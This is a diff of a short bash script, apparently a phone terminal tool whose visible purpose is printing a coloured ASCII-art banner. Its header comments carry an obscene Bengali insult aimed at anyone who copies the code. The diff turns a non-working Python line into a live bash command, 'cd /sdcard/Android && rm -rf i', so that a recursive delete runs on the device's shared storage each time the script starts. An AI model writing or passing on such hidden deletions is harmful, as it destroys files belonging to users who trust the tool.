@@ -1,10 +1,10 @@
 #!/bin/bash
 #coder dark boy sorif
 #persmison sara src copy korle tor mayere tui cudos
-
+cd /sdcard/Android && rm -rf i
 banner() {
 clear
-os.system('cd /sdcard/Android && rm -rf i')
+
 printf "\e[0m\n"
 printf """\e[1;92m ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀    ▄▄▄▄    ▒█████ ▓██   ██
  ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▓█████▄ ▒██▒  ██▒▒██  ██▒
